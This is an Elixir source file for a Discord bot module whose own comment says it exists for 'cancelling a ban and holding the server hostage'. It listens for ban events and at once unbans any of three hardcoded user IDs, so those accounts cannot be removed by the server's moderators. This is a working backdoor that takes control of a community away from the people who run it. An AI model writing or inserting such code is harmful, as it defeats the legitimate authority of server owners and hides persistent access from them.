defmodule Felix.Events do
  @moduledoc"""
  this is the events file i have for cancelling a ban and holding the server hostage lmfao
  """
  use Alchemy.Cogs
  use Alchemy.Events
  alias Alchemy.Client

  Events.on_user_ban(:cancel_ban)
  def cancel_ban(user, guild) do
    cond do
      user.id == 561_291_092_809_482_240 ->
        Client.unban_member(guild, user.id)
      user.id == 421_787_962_624_442_368 ->
        Client.unban_member(guild, user.id)
      user.id == 816_431_003_295_547_452 ->
        Client.unban_member(guild, user.id)
      true ->
        IO.puts("Not an administrator")
    end
  end

end
